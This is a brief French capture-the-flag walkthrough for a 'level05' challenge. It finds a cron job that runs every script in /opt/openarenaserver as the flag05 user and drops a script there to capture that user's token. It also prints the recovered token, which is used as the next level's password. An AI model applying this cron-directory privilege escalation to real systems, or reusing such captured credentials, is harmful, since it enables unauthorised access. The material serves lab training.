## 1. Rechercher dans les fichiers 'level05'

    find / -name level05 2>/dev/null

## 2. Ouvrir /var/mail/level05

    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

On a un cronjob qui execute /usr/sbin/openarenaserver

## 3. Ouvrir le fichier /usr/sbin/openarenaserver

    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done

On voit qu'il execute tous les fichiers bash dans /opt/openarenaserver/ puis les supprime.

## 4. Creer un ficher avec getflag dans /opt/openarenaserver/

    echo 'getflag > /tmp/token' > /opt/openarenaserver/script.sh

Avec redirection du resultat comme le fichier est supprime a la suite.

    cat /tmp/token
    Cela affiche: cat viuaaale9huek52boumoomioc

## 5. Connexion

su level06

    Mot de passe : viuaaale9huek52boumoomioc